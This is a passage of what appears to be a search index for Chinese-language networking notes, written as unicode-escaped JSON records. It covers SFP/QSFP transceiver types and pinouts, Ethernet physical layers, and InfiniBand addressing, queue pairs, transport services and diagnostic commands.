<li>SFP+: 10Gbps</li> <li>SFP28: 25Gbps</li> <li>SFP56: 50Gbps</li> <li>QSFP: 4Gbps</li> <li>QSFP+: 40Gbps</li> <li>QSFP28: 100Gbps/50Gbps</li> <li>QSFP56: 200Gbps</li> <li>QSFP-DD: 400Gbps/200Gbps</li> <li>QSFP-DD112: 800Gbps</li> <li>OSFP: 800Gbps/400Gbps</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u540d\u5b57\u200b\u524d\u9762\u200b\u52a0\u200b\u4e86\u200b\u4e2a\u200b Q\uff08Quad\uff09\uff0c\u200b\u901f\u7387\u200b\u5c31\u200b\u7ffb\u200b\u4e86\u200b 4 \u200b\u500d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6709\u200b 4 \u200b\u4e2a\u200b lane\uff0c\u200b\u540c\u65f6\u200b\u7269\u7406\u200b\u63a5\u53e3\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u4e5f\u200b\u53d8\u5927\u200b\u4e86\u200b\u3002\u200b\u6240\u4ee5\u200b\uff0c\u200b\u4e0d\u5e26\u200b Q \u200b\u7684\u200b SFP \u200b\u7684\u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u90fd\u200b\u4e00\u6837\u200b\uff0c\u200b\u5e26\u200b Q \u200b\u7684\u200b SFP \u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u90fd\u200b\u4e00\u6837\u200b\u5927\u200b\uff0c\u200b\u4f46\u200b\u540e\u8005\u200b\u6bd4\u200b\u524d\u8005\u200b\u5927\u200b\u4e00\u4e9b\u200b\uff08SFP \u200b\u662f\u200b 113.9 mm^2\uff0cQSFP \u200b\u662f\u200b 156 mm^2\uff09\u3002OSFP \u200b\u53c8\u200b\u6bd4\u200b QSFP \u200b\u66f4\u5927\u200b\u4e00\u4e9b\u200b\uff0cO \u200b\u8868\u793a\u200b Octal\uff0c\u200b\u5c31\u662f\u200b 8 \u200b\u4e2a\u200b lane \u200b\u7684\u200b\u610f\u601d\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u5728\u200b 400G QSFP Transceiver Types and Fiber Connections \u200b\u548c\u200b 400G OSFP Transceiver Types Overview \u200b\u770b\u5230\u200b QSFP-DD \u200b\u548c\u200b OSFP \u200b\u7684\u200b\u5bf9\u6bd4\u200b\u3002</p> <p>\u200b\u901a\u5e38\u200b\uff0c\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u4e5f\u200b\u4f1a\u200b\u652f\u6301\u200b\u628a\u200b\u4e00\u4e2a\u200b QSFP \u200b\u63a5\u53e3\u200b\u62c6\u6210\u200b\u591a\u4e2a\u200b SFP \u200b\u63a5\u53e3\u200b\u6765\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6709\u200b\u7684\u200b\u7ebf\u200b\uff0c\u200b\u4e00\u8fb9\u200b\u662f\u200b QSFP28\uff0c\u200b\u53e6\u4e00\u8fb9\u200b\u662f\u200b 4xSFP28\uff0c\u200b\u53ea\u8981\u200b\u8bbe\u5907\u200b\u652f\u6301\u200b\u5373\u53ef\u200b\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u8282\u7701\u200b\u7a7a\u95f4\u200b\u3002</p>"},{"location":"networking/ethernet.html#sfp_1","title":"SFP \u200b\u7684\u200b\u63a5\u53e3","text":"<p>SFP \u200b\u6807\u51c6\u200b SFF INF-8074 \u200b\u89c4\u5b9a\u200b\u4e86\u200b 20 \u200b\u6839\u200b\u4fe1\u53f7\u7ebf\u200b\uff0c\u200b\u6b63\u53cd\u9762\u200b\u5404\u200b 10 \u200b\u6839\u200b\uff0c\u200b\u91cd\u8981\u200b\u7684\u200b\u662f\u200b\u4e0b\u9762\u200b\u7684\u200b\u8fd9\u4e9b\u200b\uff08\u200b\u62ec\u53f7\u200b\u91cc\u200b\u5199\u200b\u7684\u200b\u662f\u200b Pin \u200b\u7684\u200b\u7f16\u53f7\u200b\uff09\uff1a</p> <ol> <li>Mod_ABS\uff086\uff09\uff1a\u200b\u6a21\u5757\u200b\u662f\u5426\u200b\u63d2\u5165\u200b</li> <li>RD+\uff0813\uff09\u3001RD-\uff0812\uff09\uff1a\u200b\u63a5\u6536\u6570\u636e\u200b\u7684\u200b\u5dee\u5206\u200b\u5bf9\u200b</li> <li>TD+\uff0818\uff09\u3001TD-\uff0819\uff09\uff1a\u200b\u4f20\u8f93\u6570\u636e\u200b\u7684\u200b\u5dee\u5206\u200b\u5bf9\u200b</li> <li>SDA\uff084\uff09\u3001SCL\uff085\uff09\uff1a\u200b\u6a21\u5757\u200b\u7684\u200b I2C</li> <li>Tx_Fault\uff082\uff09\u3001Tx_Disable\uff083\uff09\u3001Rx_LOS\uff088\uff09\uff1a\u200b\u4e00\u4e9b\u200b\u72b6\u6001\u200b\u4fe1\u53f7\u200b</li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6536\u548c\u53d1\u200b\u5404\u6709\u200b\u4e00\u4e2a\u200b\u5dee\u5206\u200b\u5bf9\u200b\u5171\u200b 4 \u200b\u6761\u200b\u6570\u636e\u7ebf\u200b\u3002\u200b\u76f8\u5bf9\u200b\u5e94\u200b\u7684\u200b\uff0cQSFP \u200b\u6536\u548c\u53d1\u200b\u5404\u6709\u200b\u56db\u200b\u5bf9\u200b\u5dee\u5206\u200b\u5bf9\u200b\u5171\u200b 16 \u200b\u6761\u200b\u6570\u636e\u7ebf\u200b\uff0c\u200b\u4e00\u5171\u200b 38 \u200b\u6839\u7ebf\u200b\u3002\u200b\u5e76\u4e14\u200b\u6709\u200b\u4e00\u4e9b\u200b\u4fe1\u53f7\u200b\u662f\u200b\u590d\u7528\u200b\u4e86\u200b\u540c\u6837\u200b\u7684\u200b pin\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u53ef\u4ee5\u200b\u8282\u7701\u200b\u4e00\u4e9b\u200b pin\uff0c\u200b\u662f\u200b\u5f88\u200b\u5e38\u89c1\u200b\u7684\u200b\u3002</p>"},{"location":"networking/ethernet.html#_5","title":"\u7269\u7406\u5c42","text":""},{"location":"networking/ethernet.html#100base-tx","title":"100BASE-TX","text":"<p>\u200b\u5728\u200b IEEE 802.3 \u200b\u7684\u200b Clause 24 \u200b\u548c\u200b 25 \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u3002</p> <p>100BASE-TX \u200b\u7684\u200b\u7269\u7406\u5c42\u200b\u5206\u4e3a\u200b PCS\uff0cPMA\uff0cPMD\u3002\u200b\u4e0e\u200b MAC \u200b\u7684\u200b\u8fde\u63a5\u200b\u662f\u200b MII \u200b\u63a5\u53e3\u200b\uff0cMII \u200b\u9891\u7387\u200b\u662f\u200b 25MHz\uff0c\u200b\u6bcf\u200b\u5468\u671f\u200b\u4f20\u8f93\u200b 4 bit \u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u7136\u540e\u200b PCS \u200b\u8d1f\u8d23\u200b\u628a\u200b 4 bit \u200b\u7684\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b 4B/5B \u200b\u8f6c\u6362\u200b\u4e3a\u200b 5 bit \u200b\u7684\u200b code group\uff1bPMA \u200b\u4f7f\u7528\u200b NRZI \u200b\u8fdb\u884c\u200b\u7f16\u7801\u200b\uff1bPMD \u200b\u5c42\u200b\u501f\u7528\u200b\u4e86\u200b FDDI \u200b\u534f\u8bae\u200b\u7684\u200b PMD \u200b\u5c42\u200b\uff0c\u200b\u53ea\u200b\u4f7f\u7528\u200b MDI \u200b\u7684\u200b 1-3 \u200b\u548c\u200b 6 \u200b\u56db\u6839\u200b\u7ebf\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4e24\u5bf9\u200b\u5dee\u5206\u200b\u5bf9\u200b\uff0c\u200b\u4e00\u6536\u200b\u4e00\u53d1\u200b\u3002</p>"},{"location":"networking/ethernet.html#1000base-t","title":"1000BASE-T","text":"<p>\u200b\u5728\u200b IEEE 802.3ab-1999 \u200b\u4e2d\u200b\u5b9a\u4e49\u200b\uff0c\u200b\u5177\u4f53\u4f4d\u7f6e\u200b\u662f\u200b Clause 40\u3002</p> <p> </p> 1000BASE-T\uff08\u200b\u56fe\u6e90\u200b 802.3 Clause 40\uff09 <p>\u200b\u7269\u7406\u5c42\u200b\u5f80\u200b\u4e0a\u200b\u901a\u8fc7\u200b GMII \u200b\u8fde\u63a5\u200b MAC\uff0c\u200b\u5f80\u200b\u4e0b\u200b\u901a\u8fc7\u200b MDI \u200b\u8fde\u63a5\u200b\u5176\u4ed6\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u3002\u200b\u7269\u7406\u5c42\u200b\u53c8\u200b\u5305\u62ec\u200b PCS \u200b\u548c\u200b PMA\u3002</p> <p>1000BASE-T \u200b\u4f7f\u7528\u200b\u56db\u5bf9\u200b\u5dee\u5206\u200b\u7ebf\u200b\uff0c\u200b\u6bcf\u200b\u5bf9\u200b\u5dee\u5206\u200b\u7ebf\u4e0a\u200b\u90fd\u200b\u662f\u200b\u5168\u53cc\u5de5\u200b\u4f20\u8f93\u200b\uff0c\u200b\u6ce2\u7279\u7387\u200b 125Mbaud\uff0csymbol \u200b\u7684\u200b\u8303\u56f4\u200b\u662f\u200b <code>{2, 1, 0, -1, -2}</code>\uff0c\u200b\u901a\u8fc7\u200b PAM5 \u200b\u4f20\u8f93\u200b\u3002</p> <p>\u200b\u5177\u4f53\u6765\u8bb2\u200b\uff0cPCS \u200b\u4ece\u200b MAC \u200b\u7684\u200b GMII \u200b\u63a5\u53e3\u200b\u63a5\u6536\u200b\u8981\u200b\u53d1\u9001\u200b\u7684\u200b\u6570\u636e\u200b\uff0cGMII \u200b\u662f\u200b 125MHz\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b 8 \u200b\u4f4d\u200b\u6570\u636e\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u6570\u636e\u200b\u4e0e\u200b scrambler \u200b\u4e00\u8d77\u200b\uff0c\u200b\u751f\u6210\u200b 9 \u200b\u4f4d\u200b\u7684\u200b <code>Sd_n[8:0]</code>\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u7f16\u7801\u200b\u4e3a\u200b <code>(TA_n, TB_n, TC_n, TD_n)</code>\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5728\u200b\u56db\u200b\u5bf9\u200b\u5dee\u5206\u200b\u7ebf\u4e0a\u200b\u4f20\u8f93\u200b\u7684\u200b symbol\uff0c\u200b\u53d6\u503c\u200b\u8303\u56f4\u200b\u662f\u200b <code>[-2, 2]</code>\u3002\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b 8 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u5148\u200b\u53d8\u6210\u200b 9 \u200b\u4f4d\u200b\u6570\u636e\u200b\uff0c\u200b\u518d\u200b\u53d8\u6210\u200b 4 \u200b\u4e2a\u200b symbol\uff0c\u200b\u6bcf\u4e2a\u200b symbol \u200b\u53d6\u503c\u200b\u8303\u56f4\u200b\u662f\u200b -2 \u200b\u5230\u200b 2\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u53eb\u505a\u200b 8B1Q4\uff0c<code>converting GMII data (8B-8 bits) to four quinary symbols (Q4) that are transmitted during one clock (1Q4)</code>\uff0c\u200b\u628a\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u8f6c\u6362\u200b\u4e3a\u200b\u56db\u4e2a\u200b symbol\uff0c\u200b\u6bcf\u4e2a\u200b symbol \u200b\u6709\u200b\u4e94\u79cd\u200b\u53d6\u503c\u200b\uff08Quinary \u200b\u8868\u793a\u200b 5\uff09\u3002</p>"},{"location":"networking/infiniband.html","title":"InfiniBand","text":""},{"location":"networking/infiniband.html#_1","title":"\u6982\u89c8","text":"<p>InfiniBand \u200b\u7684\u200b\u7f51\u7edc\u200b\u5206\u4e3a\u200b\u4e24\u5c42\u200b\uff0c\u200b\u7b2c\u4e00\u5c42\u200b\u662f\u200b\u7531\u200b End Node \u200b\u548c\u200b Switch \u200b\u7ec4\u6210\u200b\u7684\u200b Subnet\uff0c\u200b\u7b2c\u4e8c\u5c42\u200b\u662f\u200b\u7531\u200b Router \u200b\u8fde\u63a5\u8d77\u6765\u200b\u7684\u200b\u82e5\u5e72\u4e2a\u200b Subnet\u3002\u200b\u6709\u70b9\u200b\u7c7b\u4f3c\u200b\u4ee5\u592a\u7f51\u200b\u4ee5\u53ca\u200b IP \u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u540c\u4e00\u4e2a\u200b\u4e8c\u5c42\u200b\u5185\u200b\u901a\u8fc7\u200b MAC \u200b\u5730\u5740\u200b\u8f6c\u53d1\u200b\uff0c\u200b\u4e09\u5c42\u200b\u95f4\u200b\u901a\u8fc7\u200b IP \u200b\u5730\u5740\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u5728\u200b IB \u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0cEnd Node \u200b\u4e00\u822c\u200b\u662f\u200b\u63d2\u200b\u5728\u200b\u7ed3\u70b9\u200b\u4e0a\u200b\u7684\u200b IB \u200b\u5361\u200b\uff08Host Channel Adapter\uff0cHCA\uff09\u200b\u6216\u8005\u200b\u662f\u200b\u5b58\u50a8\u200b\u7ed3\u70b9\u200b\u4e0a\u200b\u7684\u200b Target Channel Adapter\u3002End Node \u200b\u4e4b\u95f4\u200b\u901a\u8fc7\u200b Switch \u200b\u8fde\u63a5\u6210\u200b\u4e00\u4e2a\u200b Subnet\uff0c\u200b\u7531\u200b Subnet Manager \u200b\u7ed9\u200b\u6bcf\u4e2a\u200b Node \u200b\u548c\u200b Switch \u200b\u5206\u914d\u200b Local ID\uff0c\u200b\u540c\u4e00\u4e2a\u200b Subnet \u200b\u4e2d\u200b\u901a\u8fc7\u200b LID\uff08Local ID\uff09\u200b\u6765\u200b\u8def\u7531\u200b\u3002\u200b\u4f46\u662f\u200b LID \u200b\u4f4d\u6570\u200b\u6709\u9650\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8fdb\u4e00\u6b65\u200b\u6269\u5c55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b Router \u200b\u8fde\u63a5\u200b\u591a\u4e2a\u200b Subnet\uff0c\u200b\u6b64\u65f6\u200b\u8981\u200b\u901a\u8fc7\u200b GID\uff08Global ID\uff09\u200b\u6765\u200b\u8def\u7531\u200b\u3002</p> <p> </p> IBA \u200b\u7f51\u7edc\u7ed3\u6784\u200b\uff08\u200b\u56fe\u6e90\u200b InfiniBand Spec\uff09 <p> </p> IBA \u200b\u67b6\u6784\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b Infiniband Architectural Overview\uff09"},{"location":"networking/infiniband.html#queue-pair","title":"Queue Pair","text":"<p>\u200b\u56de\u987e\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u4ee5\u592a\u7f51\u200b\u7f51\u5361\u200b\u5728\u200b\u4f20\u8f93\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e24\u7c7b\u200b\u961f\u5217\u200b\uff0c\u200b\u5206\u522b\u200b\u7528\u4e8e\u200b\u53d1\u9001\u200b\u548c\u200b\u63a5\u6536\u200b\uff0c\u200b\u7531\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u6765\u200b\u8d1f\u8d23\u200b\u7ef4\u62a4\u200b\u3002\u200b\u5f53\u8981\u200b\u53d1\u9001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5411\u200b\u53d1\u9001\u200b\u961f\u5217\u200b\u4e0a\u200b\u63d2\u5165\u200b\u4e00\u9879\u200b\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u8981\u200b\u53d1\u9001\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u6307\u9488\u200b\uff0c\u200b\u7136\u540e\u200b\u8ba9\u200b\u7f51\u5361\u200b\u81ea\u5df1\u200b\u8fdb\u884c\u200b DMA \u200b\u5e76\u200b\u53d1\u9001\u200b\uff1b\u200b\u540c\u65f6\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e5f\u200b\u4f1a\u200b\u5206\u914d\u200b\u4e00\u4e9b\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u586b\u5165\u200b\u63a5\u6536\u200b\u961f\u5217\u200b\uff0c\u200b\u5f53\u200b\u7f51\u5361\u200b\u63a5\u6536\u200b\u5230\u200b\u65b0\u200b\u7684\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u8fdb\u884c\u200b DMA \u200b\u628a\u200b\u6570\u636e\u200b\u586b\u5165\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u7136\u540e\u200b\u901a\u8fc7\u200b\u4e2d\u65ad\u200b\u8ba9\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53bb\u200b\u8fdb\u884c\u200b\u5904\u7406\u200b\u3002</p> <p>\u200b\u5728\u200b IB \u200b\u4e2d\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5c31\u662f\u200b Queue Pair\uff08QP\uff09\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b Send Queue \u200b\u548c\u200b Receive Queue \u200b\u6210\u200b\u5bf9\u200b\u51fa\u73b0\u200b\u3002\u200b\u53e6\u5916\u200b\u8fd8\u6709\u200b Completion Queue\uff0c\u200b\u5f53\u200b\u8bf7\u6c42\u200b\u5b8c\u6210\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5728\u200b CQ \u200b\u4e0a\u200b\u5f97\u5230\u200b\u7ed3\u679c\u200b\u3002</p> <p> </p> IBA \u200b\u7f51\u7edc\u7ed3\u6784\u200b\uff08\u200b\u56fe\u6e90\u200b InfiniBand Spec\uff09"},{"location":"networking/infiniband.html#transport-functions","title":"Transport Functions","text":"<p>\u200b\u6709\u200b\u4e86\u200b Queue Pair \u200b\u4ee5\u540e\u200b\uff0c\u200b\u4e0a\u5c42\u200b\u5e94\u7528\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u4e86\u200b\uff1a</p> <ul> <li>SEND\uff1a\u200b\u53d1\u9001\u6570\u636e\u200b</li> <li>RESYNC\uff1a\u200b\u540c\u6b65\u200b PSN</li> <li>RDMA WRITE\uff1a\u200b\u8fdc\u7a0b\u200b\u5199\u5165\u200b\u5185\u5b58\u200b</li> <li>RDMA READ\uff1a\u200b\u8fdc\u7a0b\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b</li> <li>ATOMIC\uff1a\u200b\u8fdc\u7a0b\u200b\u8fdb\u884c\u200b\u5185\u5b58\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b</li> </ul> <p>\u200b\u6709\u53d1\u200b\u5c31\u200b\u6709\u200b\u6536\u200b\uff0c\u200b\u63a5\u6536\u200b\u65b9\u200b\u9700\u8981\u200b\u5728\u200b Receive Queue \u200b\u4e2d\u200b\u51c6\u5907\u200b\u597d\u200b\u63a5\u53d7\u200b\u6570\u636e\u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5728\u200b\u4fdd\u8bc1\u200b\u5b89\u5168\u6027\u200b\u4ee5\u53ca\u200b\u6b63\u786e\u6027\u200b\u7684\u200b\u524d\u63d0\u200b\u4e0b\u200b\uff0c\u200b\u5141\u8bb8\u200b RDMA \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e94\u7528\u200b\u9700\u8981\u200b\u9996\u5148\u200b\u8fdb\u884c\u200b Memory Binding \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6807\u8bb0\u200b\u54ea\u4e9b\u200b\u5185\u5b58\u200b\u533a\u57df\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b RDMA \u200b\u8bbf\u95ee\u200b\uff0c\u200b\u5e76\u4e14\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b <code>R_KEY</code> \u200b\u6765\u200b\u6807\u8bb0\u200b\u8fd9\u7247\u200b\u5185\u5b58\u200b\u533a\u57df\u200b\u3002\u200b\u4e4b\u540e\u200b\u7684\u200b RDMA WRITE \u200b\u548c\u200b RDMA READ \u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u540c\u6837\u200b\u7684\u200b <code>R_KEY</code> \u200b\u6765\u200b\u8fdb\u884c\u200b\u8bbf\u95ee\u200b\u3002</p>"},{"location":"networking/infiniband.html#transport-services","title":"Transport Services","text":"<p>IB \u200b\u652f\u6301\u200b\u56db\u79cd\u200b Transport Service\uff0c\u200b\u5f53\u200b QP \u200b\u5728\u200b\u521b\u5efa\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u4ece\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u56db\u79cd\u200b\u4e2d\u200b\u9009\u62e9\u200b\uff1a</p> <ol> <li>Reliable Connection(RC)</li> <li>Reliable Datagram(RD)</li> <li>Unreliable Datagram(UD)</li> <li>Unreliable Connection(UC)</li> </ol> <p>\u200b\u5bf9\u4e8e\u200b IPoIB \u200b\u7b49\u200b\u4f20\u8f93\u200b\u5176\u4ed6\u200b\u534f\u8bae\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5c01\u88c5\u200b\uff1a</p> <ol> <li>Raw IPv6 Datagram</li> <li>Raw Ethertype Datagram</li> </ol> <p>\u200b\u51e0\u79cd\u200b Transport Service \u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> <p> </p> IB Transport Service \u200b\u5bf9\u6bd4\u200b\uff08\u200b\u56fe\u6e90\u200b InfiniBand Spec\uff09 <p>\u200b\u5728\u200b\u7f16\u7a0b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u77e5\u9053\u200b\u5bf9\u200b\u7aef\u7684\u200b LID\uff08Local ID\uff09\u3001QPN\uff08Queue Pair Number\uff09\u200b\u548c\u200b PSN\uff08Packet Sequence Number\uff09\uff0c\u200b\u624d\u80fd\u200b\u8fdb\u884c\u200b\u901a\u4fe1\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u8fdb\u884c\u200b RDMA\uff0c\u200b\u8fd8\u200b\u9700\u8981\u200b\u77e5\u9053\u200b <code>R_Key</code> \u200b\u548c\u200b\u5185\u5b58\u5730\u5740\u200b\u3002\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\u4e00\u822c\u200b\u662f\u200b\u901a\u8fc7\u200b TCP \u200b\u6765\u200b\u4f20\u8f93\u200b\u7684\u200b\u3002</p>"},{"location":"networking/infiniband.html#switches","title":"Switches","text":"<p>\u200b\u5728\u200b IB \u200b\u7f51\u7edc\u200b\u4e2d\u200b\uff0c\u200b\u4ea4\u6362\u673a\u200b\u7528\u6765\u200b\u8fde\u63a5\u200b\u540c\u4e00\u4e2a\u200b IB Subnet \u200b\u4e2d\u200b\u7684\u200b End Node\u3002\u200b\u5728\u200b Subnet \u200b\u4e2d\u200b\uff0c\u200b\u901a\u8fc7\u200b Local ID \u200b\u6765\u200b\u8def\u7531\u200b\uff0c\u200b\u800c\u200b Local ID \u200b\u662f\u200b\u7531\u200b Subnet Manager \u200b\u8d1f\u8d23\u200b\u5206\u914d\u200b\u7684\u200b\u3002Subnet Manager \u200b\u626b\u63cf\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u548c\u200b\u8282\u70b9\u200b\uff0c\u200b\u52a8\u6001\u5206\u914d\u200b LID\uff0c\u200b\u5e76\u4e14\u200b\u6839\u636e\u200b\u7f51\u7edc\u62d3\u6251\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u8f6c\u200b\u53d1\u8868\u200b\u3002</p> <p>\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u8f6c\u200b\u53d1\u8868\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b LID \u200b\u5230\u200b\u7aef\u53e3\u53f7\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u4e3a\u200b\u7ebf\u6027\u8868\u200b\uff08\u200b\u6570\u7ec4\u200b\uff0c\u200b\u4e0b\u6807\u200b\u662f\u200b LID\uff09\u200b\u6216\u200b\u968f\u673a\u200b\u8bbf\u95ee\u200b\u8868\u200b\uff08CAM\uff0c\u200b\u7528\u200b LID \u200b\u67e5\u200b\u7aef\u53e3\u53f7\u200b\uff09\u3002</p> <p>\u200b\u7531\u4e8e\u200b LID \u200b\u552f\u4e00\u200b\u786e\u5b9a\u200b\u4e86\u200b\u8f6c\u53d1\u200b\u8def\u5f84\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u7f51\u7edc\u200b\u6709\u200b\u5197\u4f59\u200b\uff0c\u200b\u4ece\u200b\u4e00\u4e2a\u200b End Node \u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b End Node \u200b\u6709\u200b\u591a\u6761\u200b\u8def\u5f84\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e3a\u4e86\u200b\u5229\u7528\u200b\u4e0a\u200b\u4e0d\u540c\u200b\u8def\u5f84\u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u6bcf\u6761\u200b\u8def\u5f84\u200b\u90fd\u200b\u8981\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b LID\u3002\u200b\u4e3a\u4e86\u200b\u7b80\u5316\u200b\uff0c\u200b\u5728\u200b\u5206\u914d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cSubnet Manager \u200b\u4f1a\u200b\u5206\u914d\u200b\u4e00\u6bb5\u200b\u8fde\u7eed\u200b\u7684\u200b LID\uff0c\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c\u200b\u662f\u200b <code>2^{LMC}</code> \u200b\u4e2a\u200b\uff0cLMC \u200b\u662f\u200b LID Mask Control\uff0c\u200b\u8868\u793a\u200b\u4f4e\u200b\u591a\u5c11\u200b\u4f4d\u200b Mask \u200b\u6389\u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b Endpoint\u3002\u200b\u4f8b\u5982\u200b Base LID=4\uff0cLMC=2\uff0c\u200b\u90a3\u4e48\u200b\u5b9e\u9645\u4e0a\u200b\u5206\u914d\u200b\u7684\u200b LID \u200b\u662f\u200b <code>{4,5,6,7}</code>\u3002</p> <p>opensm \u200b\u7684\u200b LID \u200b\u5206\u914d\u200b\u7b97\u6cd5\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <p>LID \u200b\u662f\u200b\u4e00\u4e2a\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u6574\u6570\u200b\uff0c\u200b\u6240\u4ee5\u200b\u540c\u4e00\u4e2a\u200b Subnet \u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u8fde\u63a5\u200b\u7684\u200b\u8bbe\u5907\u200b\u6570\u91cf\u200b\u6709\u9650\u200b\u3002\u200b\u66f4\u200b\u591a\u200b\u7684\u8bdd\u200b\u5c31\u200b\u9700\u8981\u200b\u591a\u4e2a\u200b Subnet\u3002LID \u200b\u5b9a\u4e49\u200b\uff1a</p> <ul> <li>0x0000\uff1aReserved</li> <li>0xFFFF\uff1aPermissive\uff0c\u200b\u76ee\u6807\u200b QP0</li> <li>0x0001-0xBFFF\uff1aUnicast</li> <li>0xC000-0xFFFE\uff1aMulticast</li> </ul> <p>\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u505a\u200b\u9694\u79bb\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b Partition\uff0c\u200b\u7c7b\u4f3c\u200b VLAN \u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>P_Key</code> \u200b\u6765\u200b\u5224\u65ad\u200b\u662f\u5426\u200b\u5c5e\u4e8e\u200b\u540c\u4e00\u4e2a\u200b Partition\u3002</p>"},{"location":"networking/infiniband.html#_2","title":"\u5e38\u7528\u547d\u4ee4","text":"<p>\u200b\u5e38\u7528\u200b\u7684\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u8c03\u8bd5\u200b IB \u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> <ul> <li>ibstat</li> <li>ibhosts</li> <li>ibswitches</li> <li>iblinkinfo</li> <li>ibping</li> <li>ibdiagnet</li> <li>qperf</li> </ul> <p>\u200b\u4f7f\u7528\u200b qperf/ib_send_lat 